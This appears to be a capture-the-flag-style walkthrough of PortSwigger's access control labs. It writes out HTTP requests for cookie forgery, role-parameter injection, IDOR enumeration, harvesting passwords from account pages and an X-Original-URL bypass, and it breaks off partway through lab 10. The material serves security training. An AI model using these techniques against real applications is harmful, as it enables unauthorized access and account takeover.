# Access Control Vulnerabilities - Complete PortSwigger Labs Guide

**Complete exploitation guide for all 13 PortSwigger Web Security Academy Access Control labs**

## Table of Contents

- [Overview](#overview)
- [Lab Index](#lab-index)
- [Apprentice Labs (1-5)](#apprentice-labs)
- [Practitioner Labs (6-13)](#practitioner-labs)
- [Burp Suite Features Reference](#burp-suite-features-reference)
- [Attack Techniques Summary](#attack-techniques-summary)

---

## Overview

Access control (authorization) is the application of constraints on who or what is authorized to perform actions or access resources. In the context of web applications, access control is dependent on authentication and session management:

- **Authentication** identifies the user and confirms they are who they say they are
- **Session management** identifies which subsequent HTTP requests are being made by that same user
- **Access control** determines whether the user is allowed to carry out the action they are attempting to perform

Broken access controls are a commonly encountered and often critical security vulnerability. Design and management of access controls is a complex and dynamic problem that applies business, organizational, and legal constraints to a technical implementation.

---

## Lab Index

### Apprentice Level (5 labs)
1. [Unprotected admin functionality](#lab-1-unprotected-admin-functionality)
2. [Unprotected admin functionality with unpredictable URL](#lab-2-unprotected-admin-functionality-with-unpredictable-url)
3. [User role controlled by request parameter](#lab-3-user-role-controlled-by-request-parameter)
4. [User role can be modified in user profile](#lab-4-user-role-can-be-modified-in-user-profile)
5. [User ID controlled by request parameter](#lab-5-user-id-controlled-by-request-parameter)

### Practitioner Level (8 labs)
6. [User ID controlled by request parameter, with unpredictable user IDs](#lab-6-user-id-controlled-by-request-parameter-with-unpredictable-user-ids)
7. [User ID controlled by request parameter with data leakage in redirect](#lab-7-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)
8. [User ID controlled by request parameter with password disclosure](#lab-8-user-id-controlled-by-request-parameter-with-password-disclosure)
9. [Insecure direct object references](#lab-9-insecure-direct-object-references)
10. [URL-based access control can be circumvented](#lab-10-url-based-access-control-can-be-circumvented)
11. [Method-based access control can be circumvented](#lab-11-method-based-access-control-can-be-circumvented)
12. [Multi-step process with no access control on one step](#lab-12-multi-step-process-with-no-access-control-on-one-step)
13. [Referer-based access control](#lab-13-referer-based-access-control)

---

## Apprentice Labs

### Lab 1: Unprotected Admin Functionality

**Lab Code:** ACCE.01
**Difficulty:** Apprentice
**Lab URL:** https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

#### Lab Description
This lab demonstrates a fundamental access control vulnerability where an admin panel lacks proper authentication or authorization controls, making it accessible to any user who knows the URL path.

#### Objective
Access an unprotected admin panel and delete the user "carlos" to complete the lab.

#### Vulnerability Type
Unprotected functionality - a form of vertical privilege escalation where sensitive administrative features lack proper authentication or authorization controls.

#### Step-by-Step Solution

1. **Navigate to robots.txt**
   - Append `/robots.txt` to the lab URL
   - The file contains a "Disallow" directive that reveals the admin panel's location

2. **Access the admin panel**
   - Replace `/robots.txt` in the URL bar with `/administrator-panel`
   - The panel loads without authentication

3. **Complete the objective**
   - Delete the user account named "carlos"

#### HTTP Requests and Responses

**Request 1: Discover admin path**
```http
GET /robots.txt HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Response:**
```
User-agent: *
Disallow: /administrator-panel
```

**Request 2: Access admin panel**
```http
GET /administrator-panel HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Response:** Admin interface loads without authentication checks

**Request 3: Delete user**
```http
GET /administrator-panel/delete?username=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
```

#### Burp Suite Features Needed
- **Web Vulnerability Scanner**: Can automatically identify access control issues
- Basic proxy functionality to intercept requests
- Free version of Burp Suite is sufficient

#### Tips and Common Mistakes
- Many developers mistakenly believe `robots.txt` provides security; it merely guides search engines and is publicly readable
- The `Disallow` line actually discloses sensitive paths to potential attackers
- Never rely on obscurity or robots.txt for access control

#### Key Takeaway
Sensitive administrative functionality must be protected with proper authentication and authorization mechanisms, not just obscure URLs.

---

### Lab 2: Unprotected Admin Functionality with Unpredictable URL

**Lab Code:** ACCE.02
**Difficulty:** Apprentice
**Lab URL:** https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url

#### Lab Description
This lab demonstrates "security through obscurity" - relying on hidden or unpredictable URLs instead of proper authentication/authorization controls. The admin panel is located at an unpredictable URL but the location is disclosed somewhere in the application.

#### Objective
Access an unprotected admin panel located at an unpredictable URL and delete the user "carlos".

#### Vulnerability Type
Security through obscurity combined with unprotected functionality. The admin panel lacks proper access control mechanisms, making it vulnerable once the URL is discovered.

#### Step-by-Step Solution

1. **Navigate to the lab's home page**
   - Load the main page of the application

2. **Examine the page source**
   - Use Burp Suite or browser developer tools (View Source or Inspect)
   - Search for JavaScript files and code

3. **Find the admin panel URL**
   - Look for JavaScript that reveals the admin panel's URL
   - Common patterns to search for:
     - `admin`
     - `isAdmin`
     - `adminPanelTag`
   - Example JavaScript code you might find:
   ```javascript
   var isAdmin = false;
   if (isAdmin) {
       var topLinksTag = document.getElementsByClassName("top-links")[0];
       var adminPanelTag = document.createElement('a');
       adminPanelTag.setAttribute('href', '/admin-abc123');
       adminPanelTag.innerText = 'Admin panel';
       topLinksTag.append(adminPanelTag);
   }
   ```

4. **Access the admin panel**
   - Copy the disclosed admin panel URL (e.g., `/admin-abc123`)
   - Navigate to it in your browser

5. **Delete the target user**
   - Locate the delete user function within the admin panel
   - Execute the deletion of the "carlos" user account

#### HTTP Requests and Responses

**Request 1: View page source**
```http
GET / HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Response:** HTML with embedded JavaScript containing admin URL

**Request 2: Access admin panel**
```http
GET /admin-abc123 HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Response:** Admin panel interface

**Request 3: Delete user**
```http
GET /admin-abc123/delete?username=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
```

#### Burp Suite Features Needed
- **Proxy tool**: To intercept and view traffic
- **Developer tools integration**: For viewing page source
- Basic browsing functionality (browser dev tools can also work)

#### Tips and Common Mistakes
- **Key hint:** "The location is disclosed somewhere in the application" - focus on page source
- Examine ALL JavaScript files for URL references
- Don't waste time brute-forcing; the URL is intentionally disclosed
- Look for admin path variables or conditional rendering logic in JavaScript
- Use browser search (Ctrl+F) to find keywords like "admin", "panel", "href"

#### Key Takeaway
Security through obscurity is not a valid security control. Unpredictable URLs must still be protected with proper authentication and authorization.

---

### Lab 3: User Role Controlled by Request Parameter

**Lab Code:** ACCE.03
**Difficulty:** Apprentice
**Lab URL:** https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter

#### Lab Description
This lab demonstrates an access control vulnerability where administrator status is determined by a forgeable cookie. The application improperly trusts a client-modifiable cookie to enforce authorization decisions.

#### Objective
Exploit the weakness by modifying the authentication cookie to gain admin access and delete the user "carlos" from the admin panel located at `/admin`.

#### Credentials
- Username: `wiener`
- Password: `peter`

#### Vulnerability Type
Parameter-based access control exploitation where the application trusts client-side data for authorization decisions.

#### Step-by-Step Solution

1. **Attempt to browse to /admin**
   - Navigate to `/admin` to confirm access is denied
   - Note the "Admin interface only available if logged in as an administrator" message

2. **Proceed to the login page**
   - Go to the login functionality

3. **Activate Burp Proxy with response interception**
   - In Burp Proxy, turn interception ON
   - Enable response interception (critical step)
   - Go to Proxy > Options > Intercept Server Responses
   - Check "Intercept responses based on the following rules"
   - Ensure rules are enabled for the target domain

4. **Submit login credentials**
   - Enter credentials: `wiener:peter`
   - Submit the login form
   - Burp will intercept the request - Forward it

5. **Intercept and modify the response**
   - After forwarding the request, Burp will intercept the response
   - Locate the Set-Cookie header containing `Admin=false`
   - Change the cookie value to `Admin=true`
   - Forward the modified response to the browser

6. **Access admin panel**
   - Navigate to `/admin` - you now have access

7. **Delete the target user**
   - Delete the "carlos" account from the admin panel
   - URL will be something like: `/admin/delete?username=carlos`

#### HTTP Requests and Responses

**Login Request:**
```http
POST /login HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=wiener&password=peter
```

**Original Response:**
```http
HTTP/1.1 302 Found
Set-Cookie: Admin=false; Path=/
Set-Cookie: session=[session-token]; Path=/
Location: /my-account
```

**Modified Response (intercept and change):**
```http
HTTP/1.1 302 Found
Set-Cookie: Admin=true; Path=/
Set-Cookie: session=[session-token]; Path=/
Location: /my-account
```

**Access Admin Panel:**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: Admin=true; session=[session-token]
```

**Response:** Admin panel with delete functionality

#### Burp Suite Features Required
- **Proxy with Interception**: Standard request interception
- **Response Interception**: CRITICAL - must be enabled to intercept and modify the authentication cookie before it's processed by the browser
  - Proxy > Options > Intercept Server Responses
  - Enable response interception rules

#### Tips and Common Mistakes
- Users often forget to enable response interception - request interception alone won't work
- The vulnerability relies on client-side cookie handling without server-side validation
- The server never validates whether the Admin cookie value is legitimate
- Ensure you modify the response BEFORE it reaches your browser
- If you miss the response, log out and try again with response interception enabled

#### Key Takeaway
Never trust client-side data for security decisions. Authorization should always be validated server-side using session data stored securely on the server.

---

### Lab 4: User Role Can Be Modified in User Profile

**Lab Code:** ACCE.04
**Difficulty:** Apprentice
**Lab URL:** https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

#### Lab Description
This lab demonstrates parameter-based privilege escalation where user roles can be modified through API requests. The admin panel at `/admin` is only accessible to logged-in users with a `roleid` of 2.

#### Objective
Access the admin panel and delete the user "carlos" by exploiting the ability to modify user roles.

#### Credentials
- Username: `wiener`
- Password: `peter`

#### Vulnerability Type
Parameter-based access control flaw - vertical privilege escalation. The application trusts user-supplied role identifiers in request bodies without implementing server-side authorization checks.

#### Step-by-Step Solution

1. **Authenticate using provided credentials**
   - Log in with `wiener:peter`

2. **Navigate to your account page**
   - Access the email update feature
   - This is typically at `/my-account`

3. **Initiate an email change request**
   - Update your email address to any value
   - Observe the server response in Burp

4. **Capture the email submission request**
   - Use Burp Proxy to intercept the request
   - Send it to Burp Repeater (Right-click > Send to Repeater)

5. **Examine the response**
   - Send the request in Repeater
   - Notice the response contains JSON including a `roleid` field
   - Example response:
   ```json
   {
     "username": "wiener",
     "email": "newemail@example.com",
     "apikey": "abc123",
     "roleid": 1
   }
   ```

6. **Modify the JSON request body**
   - Add `"roleid":2` to the JSON alongside the email parameter
   - Example modified request body:
   ```json
   {"email":"newemail@example.com","roleid":2}
   ```

7. **Resend the modified request**
   - Send the request from Repeater
   - Confirm the response shows `roleid` has changed to 2

8. **Access the admin panel**
   - Browse to `/admin` using your now-privileged account

9. **Delete the target user**
   - Locate and delete the user named "carlos"

#### HTTP Requests and Responses

**Original Email Update Request:**
```http
POST /my-account/change-email HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/json
Cookie: session=[your-session-token]
Content-Length: 37

{"email":"newemail@example.com"}
```

**Original Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "username": "wiener",
  "email": "newemail@example.com",
  "apikey": "abc123",
  "roleid": 1
}
```

**Modified Request (with roleid injection):**
```http
POST /my-account/change-email HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/json
Cookie: session=[your-session-token]
Content-Length: 50

{"email":"newemail@example.com","roleid":2}
```

**Modified Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "username": "wiener",
  "email": "newemail@example.com",
  "apikey": "abc123",
  "roleid": 2
}
```

**Access Admin Panel:**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response:** Admin panel interface (now accessible with roleid=2)

#### Burp Suite Features Required
- **Burp Repeater**: Essential for intercepting, modifying, and resending the email update request
- **Proxy/Interception**: To capture the initial email submission request
- **JSON editing**: Ability to modify JSON request bodies

#### Tips and Common Mistakes
- **Key Insight:** The application reflects role information in responses to email change requests, revealing the parameter name and structure
- **Critical Step:** The vulnerability depends on inserting the privilege parameter directly into the JSON body
- **Common Mistake:** Users may attempt to modify cookies or headers instead of the request body parameters
- The server fails to re-validate authorization after parameter modification
- Make sure the JSON syntax is correct when adding the roleid parameter
- Don't forget the comma between JSON fields: `{"email":"...","roleid":2}`

#### Key Takeaway
All user-modifiable parameters must be validated. Applications should never accept role/privilege modifications from client requests without proper authorization checks.

---

### Lab 5: User ID Controlled by Request Parameter

**Lab Code:** ACCE.05
**Difficulty:** Apprentice
**Lab URL:** https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter

#### Lab Description
This lab demonstrates a classic horizontal privilege escalation vulnerability through Insecure Direct Object Reference (IDOR). The application fails to validate whether the requesting user has authorization to access the requested resource.

#### Objective
Exploit broken access controls on the user account page to retrieve the API key for user "carlos" and submit it as the solution.

#### Credentials
- Username: `wiener`
- Password: `peter`

#### Vulnerability Type
Insecure Direct Object Reference (IDOR) - horizontal privilege escalation where access controls rely solely on user input without backend verification.

#### Step-by-Step Solution

1. **Log in with provided credentials**
   - Use credentials: `wiener:peter`

2. **Navigate to your account page**
   - Observe that the account page URL contains an "id" parameter with your username
   - Example: `/my-account?id=wiener`
   - Note your API key displayed on the page

3. **Open the request in Burp Repeater**
   - Intercept the request to your account page
   - Send it to Burp Repeater (Right-click > Send to Repeater)

4. **Modify the id parameter**
   - Change the "id" parameter value from `wiener` to `carlos`
   - Example: `/my-account?id=carlos`

5. **Send the modified request**
   - Execute the request in Repeater
   - Observe that no error is returned

6. **Extract the API key**
   - The response displays carlos's account page
   - Copy the API key displayed in the response HTML
   - Look for HTML like: `<div>Your API Key is: [carlos-api-key]</div>`

7. **Submit the API key**
   - Submit the retrieved API key to complete the lab
   - There should be a "Submit solution" button on the lab page

#### HTTP Requests and Responses

**Original Request:**
```http
GET /my-account?id=wiener HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response:** Shows your account details with your API key
```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
...
<div>Your API Key is: wiener-api-key-123</div>
...
</html>
```

**Modified Request:**
```http
GET /my-account?id=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response:** Shows carlos's account details with his API key:
```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
...
<div>Your API Key is: carlos-api-key-456</div>
...
</html>
```

#### Burp Suite Features Required
- **Burp Repeater**: Essential tool for intercepting and modifying the request parameter
- **Proxy**: To capture the initial account page request

#### Tips and Common Mistakes
- The vulnerability exists because access controls rely solely on user input without backend verification
- Users can bypass restrictions by simply modifying the request parameter to target other user accounts
- There's no validation that the session owner matches the requested user ID
- Always check URL parameters, especially those containing usernames or IDs
- This is the most basic form of IDOR - directly changing a username in a URL parameter

#### Key Takeaway
Applications must validate that the authenticated user has permission to access the requested resource, not just that they are authenticated.

---

## Practitioner Labs

### Lab 6: User ID Controlled by Request Parameter, with Unpredictable User IDs

**Lab Code:** ACCE.06
**Difficulty:** Practitioner
**Lab URL:** https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids

#### Lab Description
This lab demonstrates horizontal privilege escalation where user accounts are identified using GUIDs (Globally Unique Identifiers) rather than sequential IDs. However, the application still lacks proper authorization checks.

#### Objective
Find the GUID for user "carlos", then submit his API key as the solution.

#### Credentials
- Username: `wiener`
- Password: `peter`

#### Vulnerability Type
Horizontal access control failure with IDOR. Despite using GUIDs, the system allows any authenticated user to access account pages by modifying the ID parameter without verifying authorization.

#### Step-by-Step Solution

1. **Discover the target user's GUID**
   - Browse the blog section of the application
   - Find a blog post authored by user "carlos"
   - Click on carlos's profile link or username

2. **Extract the GUID from URL**
   - When you click on carlos's profile, observe the URL
   - The URL contains his GUID: `/blogs?userId=[carlos-guid]`
   - Example: `/blogs?userId=abc123-def456-ghi789-jkl012`
   - Copy this GUID value

3. **Authenticate with your credentials**
   - Log in using `wiener:peter`

4. **Navigate to your account page**
   - Access your account page
   - Observe the URL structure: `/my-account?id=[your-guid]`
   - Note the parameter name is `id`, not `userId`

5. **Modify the id parameter**
   - Use Burp Repeater to modify the request
   - Replace your GUID with carlos's GUID
   - Change: `/my-account?id=[your-guid]`
   - To: `/my-account?id=[carlos-guid]`

6. **Extract and submit the API key**
   - The response displays carlos's account page
   - Copy his API key from the response
   - Submit it as the solution

#### HTTP Requests and Responses

**Request to discover GUID:**
```http
GET /blogs?userId=abc123-def456-ghi789-jkl012 HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Response:** Blog posts by carlos

**Original Account Request:**
```http
GET /my-account?id=[your-guid] HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Modified account request:**
```http
GET /my-account?id=abc123-def456-ghi789-jkl012 HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response:** Contains carlos's API key
```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
...
<div>Your API Key is: carlos-api-key-xyz</div>
...
</html>
```

#### Burp Suite Features Required
- **Burp Suite for Free**: Recommended for identifying access control vulnerabilities
- **Burp Repeater**: For modifying request parameters
- Browser developer tools can also work for this lab

#### Tips and Common Mistakes
- The vulnerability persists because GUIDs appear unpredictable but remain accessible through public sources (blog posts, comments, public profiles)
- Users may assume GUID-based systems are secure without proper authorization checks
- **Key Discovery Method:** Look for places where user identifiers are exposed:
  - Blog posts (author links)
  - Comments
  - Public profiles
  - Forum posts
  - Any user-generated content
- GUIDs provide obscurity but not security
- The GUID is visible in the blog's author profile link - click on the author name
- Don't confuse `userId` (in blog URLs) with `id` (in account URLs) - both use the same GUID

#### Key Takeaway
Using unpredictable identifiers (like GUIDs) is not a substitute for proper authorization checks. Applications must verify that the requesting user has permission to access the requested resource.

---

### Lab 7: User ID Controlled by Request Parameter with Data Leakage in Redirect

**Lab Code:** ACCE.07
**Difficulty:** Practitioner
**Lab URL:** https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect

#### Lab Description
This lab demonstrates a vulnerability where sensitive information is leaked in the body of a redirect response. The application attempts to prevent unauthorized access by redirecting users, but includes sensitive data in the redirect response body.

#### Objective
Obtain the API key for user "carlos" and submit it as the solution.

#### Credentials
- Username: `wiener`
- Password: `peter`

#### Vulnerability Type
Insecure Direct Object Reference (IDOR) combined with improper redirect handling that leaks data before performing the redirect.

#### Step-by-Step Solution

1. **Authenticate using provided credentials**
   - Log in with `wiener:peter`

2. **Navigate to your account page**
   - Access your account page
   - Observe the URL with your ID parameter: `/my-account?id=wiener`

3. **Capture the account request**
   - Use Burp Proxy to intercept the request
   - Send it to Burp Repeater (Right-click > Send to Repeater)

4. **Modify the id parameter to target carlos**
   - Change the `id` parameter from your username/ID to `carlos`
   - Example: `/my-account?id=carlos`

5. **Observe the redirect response**
   - Send the modified request
   - The response will be a 302 redirect to the home page
   - **CRITICAL:** Despite the redirect, examine the response body
   - Do NOT follow the redirect - stay in Repeater

6. **Extract the API key from the response body**
   - Look at the "Response" tab in Repeater
   - The response body contains the full HTML of carlos's account page
   - This sensitive data is included BEFORE the redirect is executed
   - Search for the API key in the response body
   - Example: `Your API Key is: carlos-secret-key`

7. **Submit the API key**
   - Copy the API key from the response body
   - Submit it as the solution

#### HTTP Requests and Responses

**Original Request:**
```http
GET /my-account?id=wiener HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response:** Normal account page

**Modified Request:**
```http
GET /my-account?id=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response (with data leakage):**
```http
HTTP/1.1 302 Found
Location: /
Content-Type: text/html
Content-Length: 2543

<html>
<head><title>My Account</title></head>
<body>
<div>Username: carlos</div>
<div>Your API Key is: carlos-secret-key-123</div>
<div>Email: carlos@example.com</div>
</body>
</html>
```

Notice that despite the 302 redirect, the response body contains the full account page with the API key.

#### Burp Suite Features Required
- **Burp Repeater**: Essential for modifying request parameters and observing response bodies during redirects
- **Response inspection**: Must examine the full response body, not just follow the redirect
- **Intercept responses**: Ability to view responses before browser processes redirects

#### Tips and Common Mistakes
- **Key Insight:** This demonstrates horizontal privilege escalation through parameter manipulation combined with poor redirect implementation
- Many testers miss this vulnerability because browsers automatically follow redirects without showing the response body
- Always examine redirect response bodies in Burp Suite - don't just follow the redirect
- The application "attempts" to prevent unauthorized access with a redirect, but the damage is already done
- Sensitive data should NEVER be included in a redirect response body
- In a browser, you would be redirected to the home page and never see the data
- In Burp Repeater, you can see the full response including the body before the redirect

#### Security Flaw Analysis
The application logic flaw:
1. Application receives request for carlos's account
2. Application generates the full HTML page with carlos's data
3. Application checks authorization and realizes the user shouldn't have access
4. Application adds a 302 redirect header to send user to home page
5. **BUT** the response body with sensitive data has already been generated and is sent in the response

The correct implementation should:
1. Check authorization FIRST
2. Only generate the page content if authorized
3. Redirect BEFORE generating any sensitive data

#### Key Takeaway
When implementing redirects for access control, ensure sensitive data is never included in the response body. Perform authorization checks BEFORE generating any response content.

---

### Lab 8: User ID Controlled by Request Parameter with Password Disclosure

**Lab Code:** ACCE.08
**Difficulty:** Practitioner
**Lab URL:** https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure

#### Lab Description
This lab demonstrates a horizontal access control flaw where user IDs are controlled via request parameters without proper authorization checks. The vulnerability is compounded by the fact that user account pages display existing passwords in masked input fields.

#### Objective
Retrieve the administrator's password from their account page and use it to delete the user "carlos".

#### Credentials
- Username: `wiener`
- Password: `peter`

#### Vulnerability Type
Horizontal access control flaw with password disclosure. The application fails to verify that the requesting user has permission to access another user's data, and improperly displays passwords in account pages.

#### Step-by-Step Solution

1. **Log in with provided credentials**
   - Authenticate using `wiener:peter`

2. **Navigate to the user account page**
   - Access your account page at `/my-account?id=wiener`
   - Observe that it displays your existing password in a masked input field
   - View the page source to see the password in the HTML

3. **Modify the id parameter to access administrator account**
   - Intercept the request or use Burp Repeater
   - Change the "id" parameter value to `administrator`
   - Example: `/my-account?id=administrator`

4. **Examine the response**
   - The response contains the administrator's account page
   - View the response in Burp Repeater or Render tab

5. **Extract the administrator's password**
   - The password is visible in the HTML source despite being masked visually
   - Look for: `<input type="password" value="[admin-password]">`
   - Or right-click the password field and inspect element to reveal it
   - Copy the administrator's password

6. **Log out and authenticate as administrator**
   - Log out from the wiener account
   - Log in using the administrator credentials obtained
   - Username: `administrator`
   - Password: `[extracted password]`

7. **Delete the target user**
   - Navigate to the admin panel at `/admin`
   - Delete the user "carlos"
   - URL will be: `/admin/delete?username=carlos`

#### HTTP Requests and Responses

**Original Request:**
```http
GET /my-account?id=wiener HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response:** Your account page with your password visible in source

**Modified Request:**
```http
GET /my-account?id=administrator HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response (with password disclosure):**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<body>
<h1>My Account</h1>
<div>
    <label>Username:</label>
    <input type="text" value="administrator" readonly />
</div>
<div>
    <label>Password:</label>
    <input type="password" value="admin-secret-pass-123" />
</div>
<div>
    <label>Email:</label>
    <input type="email" value="admin@example.com" />
</div>
<button>Update password</button>
</body>
</html>
```

**Login as Administrator:**
```http
POST /login HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=administrator&password=admin-secret-pass-123
```

**Delete Carlos:**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[admin-session-token]
```

#### Burp Suite Features Required
- **Burp Proxy** or **Repeater**: To intercept and modify the id parameter
- **Response inspection capability**: To view the masked password field in HTML source
- **Render view**: To see the visual representation of the page

#### Tips and Common Mistakes
- The password is visible in the HTML source despite being visually masked with `type="password"`
- Ensure proper URL encoding when modifying parameters
- This combines two vulnerabilities: IDOR and password disclosure
- Password masking in the browser is purely cosmetic and doesn't hide the value in the HTML
- Inspect element or view source to see the actual password value
- Don't forget to log out before logging in as administrator
- The "value" attribute in the password input field contains the plaintext password

#### Why This Vulnerability Exists
Many web applications pre-populate password fields in account update forms to allow users to see their current password. This is a bad practice because:
1. Passwords should never be retrievable in plaintext (they should be hashed)
2. If they must be shown, proper access controls should prevent other users from viewing them
3. Password fields should not be pre-populated - users should re-enter passwords to change them

#### Key Takeaway
Two critical security failures: (1) Lack of authorization checks allowing horizontal privilege escalation, and (2) Displaying sensitive credentials in account pages. Passwords should never be returned to the client, even in masked form.

---

### Lab 9: Insecure Direct Object References

**Lab Code:** ACCE.09
**Difficulty:** Practitioner
**Lab URL:** https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

#### Lab Description
This lab focuses on IDOR vulnerabilities in static file access. The application stores user chat transcripts as numbered text files on the server and retrieves them using static URLs with predictable filenames.

#### Objective
Find the password for the user "carlos" and log into their account by exploiting predictable file naming in the chat transcript download feature.

#### Vulnerability Type
IDOR vulnerability where applications use direct references to static files without proper authorization checks, allowing attackers to access resources belonging to other users by modifying predictable identifiers.

#### Step-by-Step Solution

1. **Access the Live chat feature**
   - Navigate to the "Live chat" tab on the application
   - Usually found in the navigation menu

2. **Send a message**
   - Send any message in the chat
   - Example: "Hello, I need help"
   - Wait for or send a response

3. **Select "View transcript"**
   - After sending a message, click the "View transcript" option
   - This downloads your chat transcript as a text file

4. **Examine the URL structure**
   - Observe the download URL for the transcript
   - Transcripts use incrementing numeric filenames (e.g., `2.txt`, `3.txt`)
   - Example URL: `/download-transcript/2.txt`
   - The number represents a sequential file identifier

5. **Manipulate the filename parameter**
   - Change the filename to `1.txt` to access the first transcript
   - Example URL: `/download-transcript/1.txt`
   - You can also test other numbers: `0.txt`, `3.txt`, etc.

6. **Extract credentials from the transcript**
   - Download and review the `1.txt` file
   - Look for passwords or credentials within the chat conversation
   - Carlos likely shared his password in his chat session
   - Example transcript content:
   ```
   CONNECTED: -- Now chatting with Hal Pline --
   You: Hi Hal, I've forgotten my password and need to login. Can you help?
   Hal Pline: No problem, your password is: carlos-password-123
   You: Thanks!
   ```

7. **Log in with stolen credentials**
   - Use the discovered credentials to log into carlos's account
   - Username: `carlos`
   - Password: `[password from transcript]`

#### HTTP Requests and Responses

**Your transcript request:**
```http
GET /download-transcript/2.txt HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response:** Your chat transcript file
```
CONNECTED: -- Now chatting with Hal Pline --
You: Hello, I need help
Hal Pline: Sure, how can I help you?
You: Never mind, I figured it out
```

**Modified request (to access carlos's transcript):**
```http
GET /download-transcript/1.txt HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[your-session-token]
```

**Response:** Contains chat transcript with carlos's password:
```
CONNECTED: -- Now chatting with Hal Pline --
carlos: Hi, my username is carlos and I can't remember my password
Hal Pline: No problem carlos, I've looked up your password: carlos-secret-pass
carlos: Thanks!
```

**Login with extracted credentials:**
```http
POST /login HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=carlos&password=carlos-secret-pass
```

#### Burp Suite Features Required
- **Web vulnerability scanner**: For identifying IDOR patterns
- **Intruder tool**: For automating filename enumeration (optional)
- **Repeater**: For manual request manipulation
- Basic proxy functionality to intercept and modify download requests

#### Automation Example with Burp Intruder
1. Send the download request to Intruder
2. Mark the filename number as a payload position: `/download-transcript/§1§.txt`
3. Set payload type to "Numbers" from 1 to 10
4. Start the attack
5. Review responses to find transcripts with credentials

#### Tips and Common Mistakes
- The vulnerability depends on "incrementing number" filenames, suggesting sequential enumeration is feasible
- Start with `1.txt` and work upwards to enumerate all transcripts
- No authorization check validates whether the requesting user owns the transcript
- This is a common vulnerability in file download functionality
- Look for patterns: incremental IDs, GUIDs, timestamps, or other predictable identifiers
- The transcript number in the URL is a direct reference to a server-side file
- Common IDOR file patterns:
  - Sequential numbers: `1.txt`, `2.txt`, `3.txt`
  - UUIDs: `abc-123-def.txt`
  - Usernames: `carlos-transcript.txt`
  - Timestamps: `20230101-120000.txt`

#### Real-World IDOR Examples
- **Invoice downloads**: `/download-invoice?id=1234` → Change to `1233` to access other invoices
- **User documents**: `/files/user123_document.pdf` → Change user ID
- **Image uploads**: `/uploads/img_001.jpg` → Enumerate to access other images
- **Report generation**: `/reports/2023-Q1.pdf` → Access other quarters
- **Backup files**: `/backups/backup_1.zip` → Download other backups

#### Key Takeaway
All file access must be protected with proper authorization checks. Never rely solely on unpredictable filenames for security; always verify the user has permission to access the requested resource.

---

### Lab 10: URL-Based Access Control Can Be Circumvented

**Lab Code:** ACCE.10
**Difficulty:** Practitioner
**Lab URL:** https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

#### Lab Description
This lab demonstrates a security flaw where a front-end system blocks external access to `/admin`, but the backend application supports the `X-Original-URL` header. This creates a bypass mechanism when the frontend only validates the standard request URL path.

#### Objective
Access the admin panel and delete user "carlos" by exploiting the URL-based access control bypass.

#### Vulnerability Type
URL-based access control bypass through HTTP header manipulation. Discrepancies between front-end and backend URL interpretation allow attackers to circumvent access controls.

#### Step-by-Step Solution

1. **Identify the blockage**
   - Navigate to `/admin` in your browser
   - Observe a "blocked" or "Access denied" response from the front-end system
   - Note the response (likely "Access denied")

2. **Test alternative URL processing**
   - Intercept any request (e.g., the home page request)
   - Send it to Burp Repeater
   - Change the request URL to `/` (root)
   - Add custom header: `X-Original-URL: /invalid`
   - Send the request

3. **Observe backend processing**
   - You receive a "not found" response (404)
   - This confirms the backend processes the `X-Original-URL` header
   - The backend is overriding the URL path with the header value
   - The frontend blocks `/invalid` in the URL but not in the header

4. **Access the admin panel**
   - Keep the request URL as `/`
   - Modify the header to: `X-Original-URL: /admin`
   - Send the request

5. **Admin panel loads successfully**
   - The backend processes the request as if it were to `/admin`
   - The frontend doesn't block it because the URL path is just `/`
   - You can now view the admin panel HTML

6. **Identify the delete endpoint**
   - From the admin panel HTML, identify the delete user endpoint
